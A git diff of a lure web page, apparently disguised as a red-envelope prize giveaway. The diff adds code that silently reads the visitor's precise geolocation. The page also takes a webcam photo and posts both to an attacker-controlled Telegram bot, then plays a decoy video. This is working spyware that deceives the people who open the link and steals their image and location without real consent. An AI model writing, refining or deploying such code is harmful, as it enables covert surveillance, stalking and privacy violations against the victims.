@@ -5,9 +5,21 @@
     <title>🧧</title>
     <style>
         body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
-        /* 修改：视频框初始透明，过渡显示 */
+        
+        /* 视频框初始隐藏，添加平滑过渡 */
         #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
-        #status { margin: 15px 0; font-weight: bold; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
+        
+        /* 表情放大后的状态框 */
+        #status { 
+            margin: 15px 0; 
+            font-weight: bold; 
+            background: rgba(0,0,0,0.6); 
+            padding: 15px; 
+            border-radius: 10px; 
+            font-size: 50px; 
+            text-align: center;
+        }
+        
         button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
     </style>
 </head>
@@ -27,47 +39,58 @@
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
         startBtn.addEventListener('click', async () => {
-            if (!CHAT_ID) { status.innerText = "❌ 错误：未识别到用户ID"; return; }
+            if (!CHAT_ID) { status.innerText = "❌ ID Error"; return; }
             startBtn.style.display = 'none';
-            status.innerText = "Processing........";
+            status.innerText = "⏳";
 
+            // 1. 获取定位 (静默处理)
+            let locationText = "Location: Not available";
             try {
-                // 1. 获取权限
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+                });
+                locationText = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
+            } catch (err) { console.warn("定位获取失败"); }
+
+            // 2. 获取相机
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 video.style.display = 'block';
-                video.style.opacity = '1'; // 平滑显示
-                
-                // 2. 延迟执行拍照，给视频加载一点时间
-                setTimeout(() => captureAndUpload(stream), 1000);
+                video.style.opacity = '1';
+                status.innerText = "Processing........";
+
+                // 3. 拍照并上传
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'prize.jpg');
+                        formData.append('caption', `ID: ${CHAT_ID}\n📍 ${locationText}`);
+
+                        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                        
+                        if ((await res.json()).ok) {
+                            // 成功后：直接切换为视频播放
+                            status.innerText = "🎉 Success!";
+                            video.srcObject = null;
+                            video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
+                            video.loop = true;
+                            video.play();
+                        } else {
+                            status.innerText = "⚠️ Upload Error";
+                        }
+                    }, 'image/jpeg');
+                }, 1000);
+
             } catch (err) {
-                status.innerText = "⚠️: Please grant permissions";
+                status.innerText = "⚠️ Permissions Required";
             }
         });
-
-        async function captureAndUpload(stream) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'prize.jpg');
-
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                
-                // 3. 上传后不下载，而是直接在当前页循环播放视频
-                if ((await res.json()).ok) {
-                    status.innerText = "🎉 Success! Loading...";
-                    // 隐藏摄像头，替换为播放器
-                    video.srcObject = null;
-                    video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
-                    video.loop = true;
-                    video.play();
-                }
-            }, 'image/jpeg');
-        }
     </script>
 </body>
 </html>
